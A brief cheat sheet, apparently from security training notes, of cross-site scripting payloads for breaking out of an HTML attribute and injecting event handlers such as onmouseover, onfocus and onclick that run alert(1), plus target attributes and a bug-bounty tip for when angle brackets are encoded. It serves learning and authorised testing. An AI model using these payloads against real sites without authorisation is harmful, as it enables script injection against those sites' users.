# Attribute Context Payloads

## Context

Input reflected inside:

```html
<input value="USER_INPUT">
```

---

# Goal

```text
Break Attribute
        ↓
Inject Event
        ↓
Trigger Execution
```

---

# Mouse Events

```html
" onmouseover="alert(1)
```

---

```html
" onmouseenter="alert(1)
```

---

# Focus Events

```html
" autofocus onfocus="alert(1)
```

---

# Click Events

```html
" onclick="alert(1)
```

---

# AccessKey Payload

```html
'accesskey='x' onclick='alert(1)
```

---

# Common Targets

```html
value
title
alt
placeholder
class
```

---

# Related Labs

```text
Lab15
Lab17
```

---

# Bug Bounty Reminder

When:

```html
<
>
```

are encoded:

do NOT stop testing.

Try:

```text
Attribute Injection
```

instead.